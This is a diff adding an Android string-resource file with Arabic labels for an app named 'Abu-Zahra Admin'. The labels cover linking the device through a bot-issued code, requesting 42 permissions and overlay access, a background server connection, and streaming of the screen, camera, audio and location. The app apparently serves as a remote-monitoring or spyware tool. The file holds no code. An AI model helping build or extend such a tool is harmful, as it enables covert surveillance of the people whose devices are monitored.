@@ -1,0 +1,50 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Abu-Zahra Admin</string>
+    
+    <!-- Main Screen -->
+    <string name="link_device_title">ربط الجهاز</string>
+    <string name="enter_link_code">أدخل رمز الربط من البوت</string>
+    <string name="link_code_hint">رمز الربط (6 أرقام)</string>
+    <string name="link_device">ربط الجهاز</string>
+    <string name="grant_permissions">منح الصلاحيات</string>
+    <string name="version_info">الإصدار 3.8.0 - 42 صلاحية</string>
+    
+    <!-- Status -->
+    <string name="device_linked">تم ربط الجهاز</string>
+    <string name="device_id_display">معرف الجهاز: %s</string>
+    <string name="linking_device">جاري ربط الجهاز...</string>
+    <string name="link_success">تم ربط الجهاز بنجاح</string>
+    <string name="link_failed">فشل الربط: %s</string>
+    <string name="error_message">خطأ: %s</string>
+    <string name="connection_error">خطأ في الاتصال: %s</string>
+    <string name="code_too_short">الرمز يجب أن يكون 6 أرقام على الأقل</string>
+    
+    <!-- Permissions -->
+    <string name="permission_required">صلاحية مطلوبة</string>
+    <string name="overlay_permission_message">هذا التطبيق يحتاج صلاحية العرض فوق التطبيقات الأخرى للعمل بشكل صحيح</string>
+    <string name="ok">موافق</string>
+    <string name="cancel">إلغاء</string>
+    
+    <!-- Service -->
+    <string name="service_channel_name">خدمة Abu-Zahra</string>
+    <string name="service_channel_description">قناة إشعارات الخدمة</string>
+    <string name="service_running">Abu-Zahra Admin يعمل</string>
+    <string name="service_connected">متصل بالخادم</string>
+    
+    <!-- Streaming Services -->
+    <string name="screen_stream_channel">بث الشاشة</string>
+    <string name="camera_stream_channel">بث الكاميرا</string>
+    <string name="audio_stream_channel">بث الصوت</string>
+    <string name="location_channel">تتبع الموقع</string>
+    
+    <!-- Notifications -->
+    <string name="notification_title">Abu-Zahra Admin</string>
+    <string name="notification_content">الخدمة تعمل في الخلفية</string>
+    
+    <!-- Errors -->
+    <string name="error_no_network">لا يوجد اتصال بالإنترنت</string>
+    <string name="error_server">خطأ في الخادم</string>
+    <string name="error_timeout">انتهت مهلة الاتصال</string>
+    <string name="error_unknown">خطأ غير معروف</string>
+</resources>
